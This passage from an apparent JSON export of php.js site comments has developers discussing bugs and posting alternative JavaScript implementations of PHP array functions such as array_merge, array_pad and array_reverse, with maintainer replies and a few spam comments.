('number'==typeof arr.length && isFinite(arr.length)) {return Array.prototype.slice.call(retObj);}\n[\/CODE]"},{"date":"2012-02-22 20:16:44","author":"Tim Younger","url":"bustedtubes.com","comment":"blast, i tried to solve it concisely without needing to loop twice. this one actually works though:\n\n[CODE]\nif (arr instanceof Array) { var retArr = []; for(k in retObj) {retArr.push(retObj[k])}; return retArr; }\n[\/CODE]"},{"date":"2012-04-17 15:24:05","author":"????? ???","url":"http:\/\/an3m1.com\/","comment":"I have a lot to benefit from this article and thank you for this wonderful effort to this article and will continue my many articles you have other \n<a href=\"http:\/\/an3m1.com\/\">\u0628\u0648\u0627\u0628\u0629 \u0646\u0639\u0645<\/a>\n"},{"date":"2012-04-17 15:26:49","author":"????? ???","url":"http:\/\/an3m1.com\/","comment":"[CODE]http:\/\/an3m1.com\/('\u0628\u0648\u0627\u0628\u0629 \u0646\u0639\u0645');[\/CODE]"}],"array_flip":[{"date":"2011-07-15 16:45:51","author":"Pier Paolo Ramon","url":"www.mastersoup.com","comment":"You should check if it's a property of the object, with hasOwnProperty.\n\n[CODE]\nfor (key in trans) {\n  if (!trans.hasOwnProperty(key)) continue;\n  tmp_ar[trans[key]] = key;\n}\n[CODE]"},{"date":"2011-07-20 03:47:32","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Pier Paolo Ramon: Good catch! Thanks--fixed in Git... (This function as with many others still needs to support reliably ordered associative arrays--see PHPJS_Array() in array().)"}],"array_intersect":[{"date":"2012-06-18 15:25:11","author":"Mike","url":"","comment":"I found bug with count of parameters for this function. So if we set over than 2 arguments - function returns empty object.\nYou can test own example with colors on this page. \n"},{"date":"2012-06-21 21:01:12","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Mike: Are you talking about this example?\n\n[CODE]$array1 = {'a' : 'green', 0:'red', 1: 'blue'};\n$array2 = {'b' : 'green', 0:'yellow', 1:'red'};\n$array3 = ['green', 'red'];\n$result = array_intersect($array1, $array2, $array3);\n[\/CODE]\n\nWhat do you get if you add this to iterate over the properties?\n\n[CODE]\nfor (var i in $result) {\n  alert(i+'::'+$result[i])\n}[\/CODE]\n\nWhat browser are you using? I am seeing the alert() in the code above run twice with the given example as it should--i.e., it is not empty."}],"array_intersect_key":[{"date":"2009-08-11 11:28:37","author":"Jean Marie","url":"","comment":"Hi,\n\nnice function i was looking for. Thanks!\n\nTwo points to mention:\n1) You're not handling arrays! It should be named object_intersect_key(). \n\n2) Is it possible to get this working in recursive.\n\n\nBest regards\nJean Marie\n"},{"date":"2009-08-11 19:04:33","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Jean Marie: Glad to hear it fit your needs... Since there is otherwise no reasonable way for us to represent associative arrays in JavaScript, the PHP.JS project generally considers objects to be as arrays. As far as your question, I am guessing you want to ensure that only those keys are returned where there is a perfect match, including any subkeys? Here is a recursive version that seems to work for this:\n\n[CODE]var_dump(\n    array_intersect_key_recursive({a:3, b:{c:5, d:5}, q:{r:5}}, {a:'z', c:'y', b:{c:6, d:8}, q:{s:5}})\n);\n\nfunction array_intersect_key_recursive () {\n    var arr1 = arguments[0], retArr = {};\n    var k1 = '', arr = {}, i = 0, k = '';\n    var ct = function (obj) {\n        var c = 0;\n        for (var p in obj) {\n            c++;\n        }\n        return c;\n    };\n    arr1keys:\n    for (k1 in arr1) {\n        var tempArr = [arr1[k1]];\n        arrs:\n        for (i=1; i < arguments.length; i++) {\n            arr = arguments[i];\n            for (k in arr) {\n                if (k === k1) {\n                    tempArr.push(arr[k]);\n                    if (i === arguments.length-1 && (typeof arr1[k1] !== 'object' || ct(arr[k]) === ct(  this.array_intersect_key_recursive.apply(this, tempArr)))) {\n                        retArr[k1] = arr1[k1];\n                    }\n                    \/\/ If the innermost loop always leads at least once to an equal value, continue the loop until done\n                    continue arrs;\n                }\n            }\n            \/\/ If it reaches here, it wasn't found in at least one array, so try next value\n            continue arr1keys;\n        }\n    }\n    return retArr;\n}[\/CODE]"},{"date":"2009-08-11 19:23:18","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Sorry, I realized the long 'if' should be changed to this to account for null values:\n\n[CODE]if (i === arguments.length-1 && (typeof arr1[k1] !== 'object' || typeof arr1[k1] === null || ct(arr[k]) === ct(  this.array_intersect_key_recursive.apply(this, tempArr)))) {[\/CODE]"},{"date":"2009-08-11 19:43:20","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Sorry again, but my reply is mistaken as well. And it will all really depend on whether you are trying to build a return array which returns all of the keys shared across arrays based on the first one, and those subkeys which are shared as well, or if you want to ensure that those whose keys match across all arrays must also, if they are objects, have subkeys which are also contained across all arrays (or otherwise not include them)..."},{"date":"2012-04-06 21:31:15","author":"TeMc","url":"","comment":"@Jean Marie:\n\n1) Maybe it should be limited to arrays, like PHP does\n\n2) No, because the purpose of this website is to re-create php functions in javascript. Feature requests are not accepted here by design."}],"array_keys":[{"date":"2008-01-22 04:20:11","author":"Ates Goral","url":"","comment":"Hey Kevin, here's my implementation for array_change_key_case().\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar CASE_LOWER = 0;\r\nvar CASE_UPPER = 1;\r\n\r\nfunction array_change_key_case(array) {\r\n    \/\/ *     example 1: array_change_key_case(42);\r\n    \/\/ *     returns 1: false\r\n    \/\/ *     example 2: array_change_key_case([ 3, 5 ]);\r\n    \/\/ *     returns 2: {0: 3, 1: 5}\r\n    \/\/ *     example 3: array_change_key_case({ FuBaR: 42 });\r\n    \/\/ *     returns 3: {&quot;fubar&quot;: 42}\r\n    \/\/ *     example 4: array_change_key_case({ FuBaR: 42 }, CASE_LOWER);\r\n    \/\/ *     returns 4: {&quot;fubar&quot;: 42}\r\n    \/\/ *     example 5: array_change_key_case({ FuBaR: 42 }, CASE_UPPER);\r\n    \/\/ *     returns 5: {&quot;FUBAR&quot;: 42}\r\n    \/\/ *     example 6: array_change_key_case({ FuBaR: 42 }, 2);\r\n    \/\/ *     returns 6: {&quot;FUBAR&quot;: 42}\r\n    \r\n    if (array instanceof Array) {\r\n        return array;\r\n    }\r\n    \r\n    if (array instanceof Object) {\r\n        var case_fn = (arguments.length == 1 || arguments[1] == CASE_LOWER) ?\r\n                &quot;toLowerCase&quot; : &quot;toUpperCase&quot;;\r\n        var ret = new Object();\r\n        \r\n        for (var key in array) {\r\n            ret[key[case_fn]()] = array[key];    \r\n        }\r\n        \r\n        return ret;\r\n    }\r\n    \r\n    return false;\r\n}\r\n[\/CODE]"},{"date":"2008-01-22 04:22:08","author":"Ates Goral","url":"","comment":"Hmmm. I should change that to:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nconst CASE_LOWER = 0;\r\nconst CASE_UPPER = 1;\r\n[\/CODE]"},{"date":"2008-01-22 08:46:41","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Nice work, added!"},{"date":"2010-01-12 10:44:01","author":"Mickael","url":"","comment":"Hi,\nI test this function with Mozilla Firefox 3.5.7 but it does not work.\nI think that Mozilla has a bug concerning \"for in\" syntax.\n\nThanks for all scripts, PHP.JS is a very good work :)"},{"date":"2010-01-12 13:35:10","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Hello Mickael,\n\nThis should definitely be working in Firefox, as that is what i use to test it. Can you please give example code which causes the problem for you? Are you using any other libraries with your code like Prototype?"},{"date":"2010-05-12 11:04:33","author":"JeromeM","url":"","comment":"Doesn't seem to work on Safari 4 ..\nNeither on Safari 3.x (i'm actually developping for iPhone \/ iPad)."},{"date":"2010-05-12 19:36:21","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@JeromeM: Can you provide some sample data where it is not working? Are you using the latest version? (see \"raw js source\" link on this page) What errors? The example is working for me"},{"date":"2011-02-16 18:12:42","author":"jd","url":"","comment":"Shouldn't line 11 be:\n\nvar tmp_arr = []\n(i.e. not curly brackets)"},{"date":"2011-02-18 05:37:28","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@jd: Yes, in this function, I see no reason we shouldn't return a genuine array, since PHP is not preserving keys of an original array here but is just starting fresh (and is only producing a sequential numeric array). I've fixed in Git. Some of our other functions, however, our constrained to return an object in order to preserve keys and\/or to avoid returning confusing arrays which have \"undefined\" interspersed throughout."},{"date":"2011-06-12 22:30:23","author":"P","url":"","comment":"The raw seems to be different than the site's copy, and in the raw copy there's a cs variable that's unaccounted for."},{"date":"2011-06-13 06:13:33","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@P: Fixed in Git. Thanks for the report!"},{"date":"2012-04-04 14:24:20","author":"????? ???","url":"http:\/\/an3m1.com\/","comment":"I have a lot to benefit from this article and thank you for this wonderful effort to this article and will continue my many articles you have other   \n"}],"array_merge":[{"date":"2008-11-19 06:14:33","author":"Nate","url":"","comment":"Neither &quot;ct&quot; nor &quot;retArr&quot; are declared with &quot;val&quot;, and therefore create unnecessary global variables.  I suggest that &quot;retArr&quot; be declared at the top and &quot;ct&quot; be declared after the code:\r\n[CODE=&quot;Javascript&quot;]\r\n    if (retArr) {\r\n        return args;\r\n    }\r\n[\/CODE]\r\nThe reason for this is because the function sometimes finishes before ever reaching the part that uses &quot;ct&quot;, and therefore, it could waste a slight amount of time declaring a variable that it didn't end up using.  The same is also true for &quot;retObj&quot;, &quot;k&quot;, and &quot;j&quot;.  But it's just a suggestion."},{"date":"2008-11-25 09:08:09","author":"Subhasis Deb","url":"http:\/\/weread.com","comment":"Following is my version of array_merge (compact):\r\n\r\n\t\/***\r\n\t * Simulate php array_merge function\r\n\t * \r\n\t * @param {Object\/Array} arr1\r\n\t * @param {Object\/Array} arr2\r\n\t * \tvar a1 = {'aa':100, 'bb':2, 'cc':[6,7], 'dd':[12,13], 'ee':{'15':15,'16':16}};\r\n\t *  var b1 = {'xx':101, 'bb':5, 'cc':8, 'dd':[14,15], 'ee':{'17':17,'18':18}};\r\n\t *  var c = array_merge(a1, b1);\r\n\t *  console.log(c) [in firebug]\r\n\t *  Output: {'aa':100, 'bb': 5, 'cc':[6,7], 'dd':[12,13,14,15], 'ee':{'15':15,'16':16,'17':17,'18':18}, 'xx':101}\t\t\r\n\t *\/\r\n\tarray_merge : function(arr1, arr2){\r\n\t\tif((arr1 &amp;&amp; (arr1 instanceof Array)) &amp;&amp; (arr2 &amp;&amp; (arr2 instanceof Array))){\r\n\t\t\tfor (var idx in arr2) {\r\n\t\t\t\tarr1.push(arr2[idx]);\r\n\t\t\t}\r\n\t\t}else if((arr1 &amp;&amp; (arr1 instanceof Object)) &amp;&amp; (arr2 &amp;&amp; (arr2 instanceof Object))){\r\n\t\t\tfor(var idx in arr2){\r\n\t\t\t\tif(idx in arr1){\r\n\t\t\t\t\tif (typeof arr1[idx] == 'object' &amp;&amp; typeof arr2 == 'object') {\r\n\t\t\t\t\t\tarr1[idx] = array_merge(arr1[idx], arr2[idx]);\r\n\t\t\t\t\t}else{\r\n\t\t\t\t\t\tarr1[idx] = arr2[idx];\r\n\t\t\t\t\t}\r\n\t\t\t\t}else{\r\n\t\t\t\t\tarr1[idx] = arr2[idx];\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn arr1;\r\n\t},"},{"date":"2008-11-25 17:07:03","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Nate: Thanks dude!\r\n@ Subhasis Deb: Could you please tell us how your function would be the better implementation?"},{"date":"2008-12-01 00:15:40","author":"Subhasis","url":"http:\/\/weread.com","comment":"@Kevin,\r\nactually its not the &quot;array_merge&quot; function but rather the &quot;array_merge_recursive&quot; function.. it can accept nested array\/object which it will merge recursively... one \r\npoint to walk over is it gives preference to array object.. so it wont overwrite array\/objects if the master array has it... e.g 'cc':[6,8], 'cc':8;  o\/p: [6,8]..\r\n\r\n------------------------------------------\r\nSubhasis\r\nhttp:\/\/weread.com"},{"date":"2009-09-26 15:03:01","author":"Matheus","url":"","comment":"This funcion don't work. It's returning [object Object]"},{"date":"2009-09-27 01:20:46","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Matheus : That probably just means that the function is returning an object and you are trying to view it as a string (like in an alert). Why does the function return an object? In order to allow for associative arrays, we must use objects in such cases (though this function tries to return a bona fide array if possible)."},{"date":"2009-10-08 21:03:45","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Subhasis: But don't we already have an array_merge_recursive function?"},{"date":"2010-03-26 19:19:09","author":"josh","url":"","comment":"this doesn't return the expected values...\n\narr1 = Array('zero','one','two','three');\narr2 = Array(4,5,6,7);\narr3 = array_merge(arr1,arr2);\n\nphp does this:\n\narr3: Array\n(\n\t[0] => zero\n\t[1] => one\n\t[2] => two\n\t[3] => three\n\t[4] => 4\n\t[5] => 5\n\t[6] => 6\n\t[7] => 7\n)\n\n\n\nwhile js function does this:\n\n0:\n\t0: zero\n\t1: one\n\t2: two\n\t3: three\n1:\n\t0: 4\n\t1: 5\n\t2: 6\n\t3: 7\n\n\ni can put two arrays into a bigger array in regular javascript...  9_9"},{"date":"2010-03-26 21:09:06","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@josh: Thanks for pointing out the bug. Fixed in git: http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/array\/array_merge.js . The code had problems when all arrays were input, but also with numeric renumbering. Sorry for the trouble on that one, but it should be working now."},{"date":"2010-03-26 21:12:18","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@josh: And, btw, if you are only dealing with simple numeric arrays, to do that in simple JS style, just do \n\n[CODE]var arr3 = arr1.concat(arr2);[\/CODE]\n\nSee also https:\/\/developer.mozilla.org\/en\/Core_JavaScript_1.5_Reference\/Global_Objects\/Array\/concat"}],"array_merge_recursive":[{"date":"2010-02-12 21:17:39","author":"Shannon","url":"","comment":"Am I doing some thing wrong? Using your example I get the following:\n[CODE]<script>\nvar arr1 = {'color': {'favorite': 'red'}, 0: 5},\n    arr2 = {0: 10, 'color': {'favorite': 'green', 0: 'blue'}};\nresult = array_merge_recursive(arr1, arr2);\n\/\/ result = {0:10,color:{0:blue,favorite:green}}\n<\/script>[CODE]\n\nI downloaded the full package so I should have all the dependencies. "},{"date":"2010-02-12 21:23:36","author":"Shannon","url":"","comment":"Sorry I included the script tags without thinking.\n\n[CODE]\nvar arr1 = {'color': {'favorite': 'red'}, 0: 5}, arr2 = {0: 10, 'color': {'favorite': 'green', 0: 'blue'}};\nresult = array_merge_recursive(arr1, arr2);\n\/\/ result = {0:10,'color':{0:'blue','favorite':'green'}}"},{"date":"2012-04-10 09:55:43","author":"????? ????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas "},{"date":"2012-07-16 18:07:20","author":"Demosthenes Koptsis","url":"","comment":"There is a bug i think.\n[CODE]\narr1 = {'color': {'favourite': 'read'}, 0: 5};\narr2 = {0: 10, 'color': {'favorite': 'green', 0: 'blue'}};\n\nResult = {0=10, 'color':{'favourite': 'read', 'favorite':'green', 0='blue'}}\n[\/CODE]\nvalue: 5 is lost!"},{"date":"2012-07-17 23:34:20","author":"Demosthenes Koptsis","url":"","comment":"This code overwrite keys with the same index. Does not preserve these values. Value 5 has key 0 same with value 10. The result is  the value 10 overwrites 5."}],"array_pad":[{"date":"2010-07-02 06:33:45","author":"Yury Ramanouski","url":"http:\/\/notelad.livejournal.com\/","comment":"[CODE]\r\n\/\/ Is for loop the best way to fill an array with same value in JavaScript? \r\n\/\/ No! Let's steal the idea from here: http:\/\/en.wikipedia.org\/wiki\/Exponentiation_by_squaring. \r\n\/\/ We get a PHP-like array_pad function: \r\n\r\nfunction array_pad(array, pad_size, pad_value){ \r\n  var tail_length = Math.abs(pad_size) - array.length;\r\n\r\n  if(tail_length <= 0){ \r\n    return array; \r\n  }\r\n\r\n  var tail = []; \r\n  var subTail = [pad_value]; \r\n  while(tail_length > 0){ \r\n    if(tail_length % 2){ \r\n      tail = tail.concat(subTail); \r\n    } \r\n    subTail = subTail.concat(subTail); \r\n    tail_length >>= 1; \r\n  }\r\n\r\n  return pad_size < 0 ? tail.concat(array) : array.concat(tail); \r\n}\r\n[\/CODE]"},{"date":"2010-07-02 09:13:35","author":"Yury Ramanouski","url":"http:\/\/notelad.livejournal.com","comment":"[CODE]\r\n\/\/ Even quicker function is possible!\r\nArray.prototype.pad = function(pad_size, pad_value){\r\n  var tail_length = Math.abs(pad_size) - this.length;\r\n  if(tail_length <= 0){\r\n    return this; \/\/ replace \"this\" with \"this.slice(0)\" if you want a copy\r\n  }\r\n\r\n  var tail = [];\r\n  var subTail = [pad_value];\r\n  for( ; ; ){\r\n    if(tail_length % 2){\r\n      tail = tail.concat(subTail);\r\n    }\r\n    if(tail_length >>= 1){\r\n      subTail = subTail.concat(subTail);\r\n    }\r\n    else{\r\n      break;\r\n    }\r\n  }\r\n\r\n  return pad_size < 0 ? tail.concat(this) : this.concat(tail);\r\n}\r\n[\/CODE]"},{"date":"2010-07-05 08:47:49","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"Nothing special, but this is my approach to this function\n\n[CODE]function array_pad(input, pad_size, pad_value){\n    try {\n        pad_size |= 0; \/\/ force pad_size to be int\n        var diff = Math.abs(pad_size) - input.length,\n            pad = [];\n\n        if(diff <= 0){\n            return input.slice(0);\n        }\n\n        while(diff--){\n            pad.push(pad_value);\n        }\n\n       return pad_size < 0 ? pad.concat(input) : input.concat(pad);\n    } catch(e) {\n        return null; \/\/ PHP throws a warning and returns null when first param isn't an array\n    }\n}[\/CODE]\n\nI wrapped the functions body with try..catch, in case the input isn't an array or anything else that has concat and slice methods (the function works also with strings, cause both methods are included in String prototype :-P). To be 99.9% compatible with PHP and not let this function handle strings, just add a condition\n\n[CODE]if(!(input instanceOf Array)){\nthrow \"Not an array\";\n}[\/CODE] or\n[CODE]if(!(input instanceOf Array)){\nreturn null;\n}[\/CODE]\nSome people prefer also \"better\" checking for arrays\n[CODE]Object.prototype.toString.call(input) !== '[object Array]'[\/CODE]\n\nAnother problem is handling arrays with non-numeric indexes. I don't see a stable strategy along the whole phpjs project, that is why I didn't implement support for it."}],"array_pop":[{"date":"2008-05-27 16:22:45","author":"delete key in array (not available in php!)","url":"","comment":"The code beneath deletes the instance with key &quot;todelete&quot; in an array, in any position in the array(!). Even PHP doesn't have an function to accomplish this.\r\n\r\nAlex Pot\r\nZinrijk Webtechniek\r\nhttp:\/\/www.zinrijk.nl\/webapplicaties\r\nHaarlem, the Netherlands\r\n\r\n[CODE=&quot;Javascript&quot;]function array_deletekey( mixed_var, todelete) {\r\n\tlast=mixed_var.length;\r\n\tnarr=new Array();\r\n\tcorrection=0;\r\n\r\n\tfor (x=0;x&lt;last;x++)\r\n\t{\r\n\t\tif(mixed_var[x]!=todelete)narr[x-correction]=mixed_var[x];\r\n\t\telse correction++;\r\n\t}\r\n\r\n\tmixed_var=narr;\r\n\treturn mixed_var;\r\n}[\/CODE]"},{"date":"2008-05-31 12:38:39","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ delete key in array: I'm not sure array_deletekey is a valid PHP functions ;) But in PHP, why don't you use unset() ?"},{"date":"2009-02-02 11:46:49","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"The harder part of fixing these functions goes beyond making them work with arrays and objects; if you really want them to be faithful to PHP, they need to force numerical indexes to start over at 0 (e.g., if you have an object which has numerical indexes starting at 5 or skipping around, etc.) as soon as these functions are used. I think we can use an inner function I developed for array_splice() to help with that."},{"date":"2009-02-02 23:33:48","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: I missed that, I'll look into it."},{"date":"2010-08-02 00:32:01","author":"aleczapka","url":"","comment":"I don't get it.. what's wrong with native javascript function\n\narray.pop() ?\n\n"},{"date":"2010-08-02 00:39:49","author":"faq","url":"","comment":"@aleczapka:\nplease read the first entry in the FAQ ( http:\/\/wiki.github.com\/kvz\/phpjs\/faq )"}],"array_rand":[{"date":"2009-05-09 13:25:38","author":"pwoul","url":"","comment":"Hi, first i'd like to thank you for this very nice function.\nBut (there's always one :D) i have a problem using it :\n\n[CODE]\nvar result = \"\";\nvar alea = array_rand([\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\"], 8);\nfor(var i in alea)\n\t{\n\tresult = result + tableau[i];\n\t}\n[\/CODE]\n\nThis code always returns the string \"abcdefgh\", the order of the characters isn't random :\/\n\nThanks for your help :)"},{"date":"2009-05-09 23:18:59","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@pwoul, You are referencing an array\/object called \"tableau\" instead of the one you randomized, \"alea\". Change it to \"alea\" (if that's what you want), and the number will vary... best wishes, Brett"},{"date":"2009-05-10 03:30:30","author":"pwoul","url":"","comment":"thanks a lot, that's working now :)\n(here's the code if someone needs it)\n\n[CODE]\nvar result = \"\";\nalea = array_rand([\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\"], 8);\nfor(var i in alea)\n\t{\n\tvar kikoo = alea[i];\n\tresult = result + tableau[kikoo];\n\t}\n[\/CODE]"},{"date":"2011-02-08 10:58:52","author":"Taai","url":"","comment":"I improved this code.\n\n[CODE]\nfunction array_rand(input, num_req) {\n\tvar input_len, rand, indexes = [], ticks = num_req || 1;\n\t\n\tif (input instanceof Array === false || ticks > (input_len = input.length)) {\n\t\treturn null;\n\t}\n\t\t\n\twhile (indexes.length != ticks) {\n\t\trand = Math.floor(Math.random() * input_len);\n\t\t\n\t\tif (indexes.indexOf(rand) == -1) {\n\t\t\tindexes.push(rand);\n\t\t}\n\t}\n\t\n\treturn ticks == 1 ? indexes[0] : indexes;\n}\n[\/CODE]\n\n\nSome (older) browsers doesn't support Array.indexOf function, so, here is a code (wich I also improved) for those older browsers (add this code at least before array_rand):\n\n[CODE]\nif (!Array.indexOf) {\n\tArray.prototype.indexOf = function(obj) {\n\t\tvar i = 0, l = this.length;\n\t\tfor (; l--; i++) if (this[i] == obj) return i;\n\t\treturn -1;\n\t}\n}\n[\/CODE]\n\n\nHave fun!"},{"date":"2011-04-21 23:23:19","author":"Eugen","url":"http:\/\/bi3.biz","comment":"one example here http:\/\/javascript.about.com\/library\/blsort2.htm"},{"date":"2012-04-10 09:55:00","author":"????? ???????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas "}],"array_reduce":[{"date":"2008-03-05 09:45:56","author":"Alfonso Jim\u00e9nez","url":"","comment":"Hey Kevin. My second contribution is here :)\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction strpbrk(haystack, char_list) {\r\n   var lon = haystack.length;\r\n   var lon_search = char_list.length;\r\n   var ret = false;\r\n   var stack = '';\r\n\r\n   if(lon &gt;= lon_search) {\r\n\tif(lon == lon_search) {\r\n\t    if(haystack == char_list)\r\n\t       ret = haystack;\r\n\t} else {\r\n\t    j = 0;\r\n\t    i = 0;\r\n\t    while(i &lt; lon_search &amp;&amp; j &lt; lon &amp;&amp; !ret) {\r\n    \t\tif(char_list[i] == haystack[j]) {\r\n\t\t      i++;\r\n\t\t      if(i == lon_search) ret = true;\r\n\t  \t}\r\n\t\tj++;\r\n\t    }\r\n\r\n\t     if(ret)\r\n\t\tfor(i = (j-lon_search); i &lt; lon; i++)\r\n\t\t\tstack += haystack[i];\r\n\r\n\t\t\tif(stack != '')\r\n\t\t\t\tret = stack;\r\n\t     }\r\n         }\r\n\r\n\treturn ret;\r\n}[\/CODE]\r\n\r\nRe"},{"date":"2008-03-05 09:49:22","author":"Alfonso Jim\u00e9nez","url":"","comment":"BTW, Usage example:\r\n\r\n[CODE=&quot;Javascript&quot;]strpbrk('This is a Simple text', 'mi')[\/CODE]\r\n\r\nRegards! Alfonso Jim\u00c3\u00a9nez (http:\/\/www.alfonsojimenez.com)"},{"date":"2008-03-05 17:25:15","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Alfonso Jim\u00c3\u00a9nez: Hi Alfonso, thanks for your second contribution &amp; the example! Only one thing, the example produces: false instead of: 'is is a Simple text.'\r\nMaybe you can see what's going wrong?\r\n(btw, I had to add the '{' &amp; '}'  to make it compatible with the packer)"},{"date":"2008-03-05 21:23:09","author":"Alfonso Jim\u00e9nez","url":"","comment":"Arggg I made an error in the last example! It's &quot;is&quot; instead of &quot;mi&quot; :) If you realize &quot;mi&quot; is not in the string &quot;This is a Simple text&quot;.\r\n\r\nI'll try to develop another contribution soon :)\r\n\r\nRegards!"},{"date":"2008-03-05 23:17:06","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Alfonso Jim\u00c3\u00a9nez: Oh I should have seen that.. Anyway, I've updated the function and the test page gives the correct results now:\r\nhttp:\/\/kevin.vanzonneveld.net\/pj_tester.php\r\n\r\nthanks again!"}],"array_reverse":[{"date":"2008-02-12 13:40:35","author":"Karol Kowalski","url":"","comment":"Hello,\r\nI've done some code refactoring, making the code do what it really needs to do (there's no need for the 2nd loop, it there?). I've run a test and it seems to be 38% faster. Here's the code\r\n[CODE=&quot;Javascript&quot;]\r\nfunction array_reverse( array, preserve_keys ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ *     example 1: array_reverse( [ 'php', '4.0', ['green', 'red'] ], true );\r\n    \/\/ *     returns 1: { 2: ['green', 'red'], 1: 4, 0: 'php'}\r\n \r\n    var i=0, f, key, keys = [], key_cnt=0, tmp_ar = {};\r\n \r\n    for(key in array){\r\n        keys[i++] = key;\r\n    }\r\n    keys = keys.reverse();\r\n    key_cnt = keys.length;\r\n    for( i=0; i &lt; key_cnt; i++ ){\r\n        tmp_ar[(preserve_keys ? keys[i] : i)] = array[keys[i]];\r\n    }\r\n \r\n    return tmp_ar;\r\n}\r\n\r\nfunction array_reverse2( array, preserve_keys ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ *     example 1: array_reverse( [ 'php', '4.0', ['green', 'red'] ], true );\r\n    \/\/ *     returns 1: { 2: ['green', 'red'], 1: 4, 0: 'php'}\r\n \r\n\tvar arr_len=array.length, newkey=0, tmp_ar = {}\r\n\t \r\n    for(var key in array){\r\n\t\tnewkey=arr_len-key-1;\r\n        tmp_ar[(!!preserve_keys)?newkey:key]=array[newkey]\r\n    }\r\n\t\r\n    \r\n    return tmp_ar;\r\n}\r\n\r\n\/\/ wrapped in windows onload cause\r\n\/\/ Firebug 1.1 throws an error otherwise\r\n\r\nwindow.onload=function () {\r\n\r\nconsole.time('array_reverse')\r\n\r\nfor (var i=10000;i;i--) {\r\n\r\narray_reverse( [ 'php', '4.0', ['green', 'red'] ], true );\r\n\r\n}\r\n\r\nconsole.timeEnd('array_reverse')\r\n\r\n\r\nconsole.time('array_reverse2')\r\n\r\nfor (var i=10000;i;i--) {\r\n\r\narray_reverse2( [ 'php', '4.0', ['green', 'red'] ], true );\r\n\r\n}\r\n\r\nconsole.timeEnd('array_reverse2')\r\n\r\n}\r\n[\/CODE]"},{"date":"2008-02-16 13:48:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Karol Kowalski: That's solid work you can take pride in Karol, thank you!"},{"date":"2008-03-21 03:53:29","author":"Brett Zamir","url":"","comment":"Seems you've already done a whole lot of work, but not knowing about your site, I had started a wiki to keep this kind of information: http:\/\/javascript.wikia.com\/wiki\/PHP-Javascript . There are a few functions there presently, but please feel free to consider hosting this at such a wiki so it can be easily maintained by the whole community! Thanks! Email me at brettz9 &amp; yahoo if you like."},{"date":"2008-03-21 04:10:17","author":"Also...","url":"","comment":"Also from the site I just mentioned, here's a function which returns a genuine array (this could probably be combined with your function to test for preserve_keys and if not present, return a genuine array?):\r\n[CODE=&quot;Javascript&quot;]function array_reverse(arr) {\r\n\t\/* Simulate copy by value *\/\r\n\tvar arr_rev = [];\r\n\tfor (var i = 0; i &lt; arr.length; i++) {\r\n\t\tarr_rev[i] = arr[i];\r\n\t}\r\n\tarr_rev.reverse();\r\n\treturn arr_rev;\r\n}[\/CODE]"},{"date":"2008-11-18 01:25:46","author":"frame","url":"","comment":"Some functions are not included in php.js or php.min.js.. why?\r\n\r\ndo you forget to?\r\n\r\nex: file_exists, array_reserve"},{"date":"2008-11-18 01:38:31","author":"frame","url":"","comment":"hmm .. i have downloaded the lib again and now there are the missing functions included.. please ignore.."},{"date":"2008-11-18 12:24:46","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ frame: Yeah php.js is by no means ready. New functions are written and bugs are being fixed. It's a good idea to update your version every once in a while."},{"date":"2011-02-09 17:57:12","author":"makanaki","url":"...","comment":"At least when there's no flag \" preserve_keys\" this function should return array, not object. "},{"date":"2011-09-20 02:30:55","author":"Paul","url":"http:\/\/PaulANorman.info","comment":"When you pass a flat array (no direct keys) of just strings, and even set [code] preserve_keys [\/code] to false, you of course keep getting an object returned, and not an array as  [code]  tmp_arr = {} [\/code] and not [code] tmp_arr = [] [\/code]\n\nSo in the case of there being no supplied keys in the array this does not seem to work.\n\n[code]\n\n  a = [\"a\", \"b\", \"c\"];\n \n  b = PhpJs.array_reverse(a);\n\n[\/code]\n\n display b and you get [object Object] under 